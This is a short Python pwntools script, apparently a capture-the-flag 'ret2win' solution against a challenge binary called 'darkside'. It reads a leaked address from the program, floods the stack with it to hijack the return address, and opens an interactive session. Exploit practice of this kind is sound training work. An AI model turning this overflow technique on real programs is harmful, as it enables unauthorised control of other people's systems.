#!/usr/bin/env python3
#ret2win
#13-04-2022

from pwn import *

exe = ELF('darkside')

context.binary = exe
context.log_level='debug'


def conn():
    if args.REMOTE:
        io = remote("addr", 1337)
    else:
        io = process([exe.path])
        if args.DEBUG:
            gdb.attach(io)

    return io


io = conn()

leak = io.recvuntil(b'\n')
leak = int(leak[-15:-1].ljust(8,b'\x00'),16)
info("Leak:%#x", leak)

io.sendline(p64(leak)*8)
io.interactive()
